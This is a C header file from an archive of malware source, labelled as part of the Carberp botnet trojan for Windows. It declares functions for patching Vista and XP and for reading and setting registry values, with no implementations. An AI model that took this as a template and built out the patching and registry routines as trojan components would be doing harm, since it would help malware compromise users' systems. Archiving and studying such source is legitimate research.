/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#pragma once

bool PatchVista();
int PatchXP();
bool IsValueExist(HKEY RootKey, LPTSTR SubKey, LPTSTR ValueNameTarg, BYTE* Data, DWORD* DataLen, DWORD* Type);
int SetRegValueDWORD(HKEY RootKey, LPTSTR SubKey, LPTSTR ValueName, DWORD Data);
int SetRegValueSZ(HKEY RootKey, LPTSTR SubKey, LPTSTR ValueName, LPTSTR Data, DWORD DataLen);
